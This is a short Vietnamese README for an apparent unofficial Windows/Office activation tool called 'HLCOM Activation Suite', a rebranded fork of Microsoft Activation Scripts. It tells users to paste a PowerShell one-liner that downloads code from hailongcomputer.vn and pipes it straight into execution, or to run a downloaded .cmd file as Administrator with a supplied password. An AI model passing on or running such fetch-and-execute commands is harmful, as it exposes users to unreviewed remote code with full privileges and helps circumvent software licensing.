# HLCOM Activation Suite - Hướng dẫn sử dụng

## Cách 1 - PowerShell (Khuyên dùng) ❤️
Đây là cách nhanh nhất, không cần tải file thủ công.

1. Nhấn **Start Menu**, gõ `PowerShell` và mở nó lên.
2. Copy dòng lệnh bên dưới và nhấn **Enter**:

```powershell
irm hailongcomputer.vn/active | iex
```

## Cách 2 - Phương pháp truyền thống
1. Tải file [**HLCOM_AIO_Final.cmd**](https://github.com/ganoipho6/Microsoft-Activation-Scripts/releases/latest/download/HLCOM_AIO_Final.cmd) từ mục Releases.
2. Chuột phải vào file chọn **Run as Administrator**.
3. Nhập mật khẩu: `toiyeuhailongcomputer`.
